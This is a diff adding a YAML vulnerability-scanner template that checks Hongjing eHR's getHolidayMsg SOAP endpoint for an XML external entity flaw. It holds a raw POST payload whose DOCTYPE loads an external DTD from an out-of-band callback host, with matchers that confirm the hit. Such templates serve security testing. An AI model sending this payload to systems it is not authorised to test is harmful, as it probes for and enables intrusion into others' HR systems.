@@ -1,0 +1,47 @@
+id: poc-yaml-hjsoft-ehr-getholidaymsg-xxe
+info:
+  name: 宏景eHR getHolidayMsg XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog, xxe
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+
+        <!DOCTYPE syscode SYSTEM "http://{{reverse}}/getHolidayMsg">
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:getHolidayMsg>
+                 <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
+                 <hrp:in1>cni23</hrp:in1>
+                 <hrp:in2><syscode>&send;</syscode></hrp:in2>
+              </hrp:getHolidayMsg>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.io.IOException"
+          - "getHolidayMsg"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
